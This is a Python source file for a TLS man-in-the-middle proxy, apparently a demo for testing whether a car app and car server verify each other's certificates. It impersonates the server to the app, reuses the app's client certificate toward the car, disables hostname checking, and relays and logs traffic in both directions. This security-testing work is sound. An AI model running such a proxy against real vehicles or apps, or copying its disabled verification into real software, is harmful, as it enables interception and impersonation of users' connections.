# mitm_proxy.py
import socket
import ssl
import threading
import logging
import os
from utils import config

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - MitMProxy - %(levelname)s - %(message)s')

# --- MitM Proxy Configuration ---
# The address the app client will connect to (the MitM proxy)
MITM_LISTEN_IP = '127.0.0.1'
MITM_LISTEN_PORT = 65005

# The actual car server address the MitM will connect to
ACTUAL_CAR_IP = config.CAR_IP
ACTUAL_CAR_PORT = config.CAR_PORT

# --- SSL Contexts for the MitM Proxy ---
# 1. Context for acting as a "fake server" to the App Client
#    It needs its OWN certificate and key. For this demo, we can reuse
#    the app's provisioning cert/key, or better, generate a dedicated "mitm-server" cert.
#    Let's generate a dedicated one for clarity if you want to be thorough.
#    For simplicity now, we'll try to reuse or assume one exists.
#    If the app client correctly verifies against its CA_CHAIN_FILE, this should fail
#    unless this mitm-server-cert.pem is ALSO signed by your root CA (which it shouldn't be for a real attack).

# For simplicity, let's assume you created a mitm-server-cert.pem and mitm-server-key.pem
# signed by a *different, untrusted CA* or self-signed for the demo.
# If you reuse, say, backend-cert.pem, the app *might* trust it if CA is same,
# but hostname check (if enabled) should still fail.

MITM_SERVER_CERT_FILE = os.path.join(config.CERT_DIR, 'backend-cert.pem')  # Reusing backend for simplicity
MITM_SERVER_KEY_FILE = os.path.join(config.CERT_DIR, 'backend-key.pem')  # Reusing backend for simplicity

# 2. Context for acting as a "fake client" to the Actual Car Server
#    It needs a client certificate to present to the car.
#    If it uses the app's cert (config.PROVISIONING_APP_CERT_FILE), the car *might* accept it
#    if the car is only checking the CA.
MITM_CLIENT_CERT_FILE = config.PROVISIONING_APP_CERT_FILE
MITM_CLIENT_KEY_FILE = config.PROVISIONING_APP_KEY_FILE


def create_mitm_server_context():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        logging.info(f"MitM: Loading FAKE SERVER cert chain: {MITM_SERVER_CERT_FILE}, {MITM_SERVER_KEY_FILE}")
        context.load_cert_chain(certfile=MITM_SERVER_CERT_FILE, keyfile=MITM_SERVER_KEY_FILE)
        # This context does NOT require client certs, as it's trying to lure the app
        context.verify_mode = ssl.CERT_NONE
        logging.info("MitM: FAKE SERVER SSL context created.")
        return context
    except Exception as e:
        logging.critical(f"MitM: Failed to create FAKE SERVER SSL context: {e}")
        raise


def create_mitm_client_context():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    try:
        logging.info(f"MitM: Loading FAKE CLIENT cert chain for car: {MITM_CLIENT_CERT_FILE}, {MITM_CLIENT_KEY_FILE}")
        context.load_cert_chain(certfile=MITM_CLIENT_CERT_FILE, keyfile=MITM_CLIENT_KEY_FILE)
        # It needs to verify the ACTUAL CAR's certificate
        logging.info(f"MitM: Loading CA chain for ACTUAL CAR server verification: {config.CA_CHAIN_FILE}")
        context.load_verify_locations(cafile=config.CA_CHAIN_FILE)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = False  # Often False in PoCs, real MitM might try to match CN if possible
        if not context.check_hostname:
            logging.warning("MitM->Car: SSL Hostname Check is DISABLED.")
        logging.info("MitM: FAKE CLIENT SSL context created for connecting to ACTUAL CAR.")
        return context
    except Exception as e:
        logging.critical(f"MitM: Failed to create FAKE CLIENT SSL context: {e}")
        raise


def forward_data(src_name, src_sock, dst_name, dst_sock):
    try:
        while True:
            data = src_sock.recv(4096)
            if not data:
                logging.info(f"Connection closed by {src_name}")
                break
            logging.debug(f"{src_name} -> {dst_name}: {data.hex()[:60]}... ({len(data)} bytes)")  # Log some data
            dst_sock.sendall(data)
    except ssl.SSLError as e:
        logging.error(f"SSL Error during data forwarding ({src_name}->{dst_name}): {e}")
    except socket.error as e:
        logging.warning(f"Socket error during data forwarding ({src_name}->{dst_name}): {e}")
    except Exception as e:
        logging.error(f"Unexpected error during data forwarding ({src_name}->{dst_name}): {e}", exc_info=True)
    finally:
        logging.info(f"Closing forwarding from {src_name} to {dst_name}")
        for sock in [src_sock, dst_sock]:
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except (OSError, socket.error):
                pass
            try:
                sock.close()
            except (OSError, socket.error):
                pass


def handle_app_connection(app_raw_socket, app_address):
    logging.info(f"MitM: Accepted raw connection from App: {app_address}")
    mitm_server_ssl_context = create_mitm_server_context()
    app_ssl_socket = None
    car_ssl_socket = None
    car_raw_socket = None

    try:
        # 1. TLS Handshake with App (MitM acts as server)
        logging.info("MitM: Attempting TLS handshake with App (MitM as Server)...")
        app_ssl_socket = mitm_server_ssl_context.wrap_socket(app_raw_socket, server_side=True)
        logging.info(f"MitM: TLS handshake with App {app_address} COMPLETE.")
        app_peer_cert = app_ssl_socket.getpeercert()
        if app_peer_cert:
            logging.info(
                f"MitM: App Client Certificate CN: {dict(x[0] for x in app_peer_cert.get('subject', [])).get('commonName')}")
        else:
            logging.warning(
                "MitM: App Client did not present a certificate (or it wasn't required by MitM server context).")

        # 2. Connect to Actual Car Server (MitM acts as client)
        logging.info(f"MitM: Attempting to connect to ACTUAL Car Server at {ACTUAL_CAR_IP}:{ACTUAL_CAR_PORT}")
        mitm_client_ssl_context = create_mitm_client_context()
        car_raw_socket = socket.create_connection((ACTUAL_CAR_IP, ACTUAL_CAR_PORT), timeout=5)

        car_server_hostname = ACTUAL_CAR_IP if mitm_client_ssl_context.check_hostname else None
        logging.info(
            f"MitM: Attempting TLS handshake with Car (MitM as Client, server_hostname='{car_server_hostname}')...")
        car_ssl_socket = mitm_client_ssl_context.wrap_socket(car_raw_socket, server_hostname=car_server_hostname)
        logging.info(f"MitM: TLS handshake with ACTUAL Car Server COMPLETE.")
        car_server_peer_cert = car_ssl_socket.getpeercert()
        if car_server_peer_cert:
            logging.info(
                f"MitM: Actual Car Server Certificate CN: {dict(x[0] for x in car_server_peer_cert.get('subject', [])).get('commonName')}")

        # 3. Start forwarding data
        logging.info("MitM: Starting data forwarding between App and Car...")
        app_to_car_thread = threading.Thread(target=forward_data, args=("App", app_ssl_socket, "Car", car_ssl_socket),
                                             daemon=True)
        car_to_app_thread = threading.Thread(target=forward_data, args=("Car", car_ssl_socket, "App", app_ssl_socket),
                                             daemon=True)

        app_to_car_thread.start()
        car_to_app_thread.start()

        app_to_car_thread.join()  # Wait for threads to finish
        car_to_app_thread.join()

    except ssl.SSLCertVerificationError as e:
        logging.error(f"MitM: SSL Certificate Verification Error during one of the handshakes: {e}")
    except ssl.SSLError as e:
        logging.error(f"MitM: SSL Error during handshake or connection: {e}")
    except socket.timeout:
        logging.error("MitM: Socket timeout during connection or handshake.")
    except socket.error as e:
        logging.error(f"MitM: Socket error: {e}")
    except Exception as e:
        logging.error(f"MitM: Unexpected error in handle_app_connection: {e}", exc_info=True)
    finally:
        logging.info(f"MitM: Cleaning up connection for {app_address}")
        if app_ssl_socket:
            app_ssl_socket.close()
        elif app_raw_socket:
            app_raw_socket.close()  # Close raw if SSL wrap failed
        if car_ssl_socket:
            car_ssl_socket.close()
        elif car_raw_socket:
            car_raw_socket.close()


def main():
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listen_socket.bind((MITM_LISTEN_IP, MITM_LISTEN_PORT))
        listen_socket.listen(5)
        logging.info(f"MitM Proxy listening on {MITM_LISTEN_IP}:{MITM_LISTEN_PORT} for App connections...")
        logging.info(f"MitM Proxy will forward to Car Server at {ACTUAL_CAR_IP}:{ACTUAL_CAR_PORT}")

        while True:
            app_conn, app_addr = listen_socket.accept()
            # Handle each connection in a new thread
            handler_thread = threading.Thread(target=handle_app_connection, args=(app_conn, app_addr), daemon=True)
            handler_thread.start()
    except OSError as e:
        logging.critical(f"MitM: Could not bind to {MITM_LISTEN_IP}:{MITM_LISTEN_PORT}. Error: {e}")
    except KeyboardInterrupt:
        logging.info("MitM Proxy shutting down...")
    finally:
        listen_socket.close()


if __name__ == "__main__":
    if not (os.path.exists(MITM_SERVER_CERT_FILE) and os.path.exists(MITM_SERVER_KEY_FILE)):
        logging.warning(
            f"MitM Warning: FAKE SERVER cert/key ({MITM_SERVER_CERT_FILE} / {MITM_SERVER_KEY_FILE}) not found. Reusing backend's for demo.")
        logging.warning("For a real MitM demo, these should be attacker-controlled certs.")
        # You could choose to exit or proceed with a warning / fallback
    if not (os.path.exists(MITM_CLIENT_CERT_FILE) and os.path.exists(MITM_CLIENT_KEY_FILE)):
        logging.warning(
            f"MitM Warning: FAKE CLIENT cert/key ({MITM_CLIENT_CERT_FILE} / {MITM_CLIENT_KEY_FILE}) not found. Reusing app's provisioning for demo.")

    main()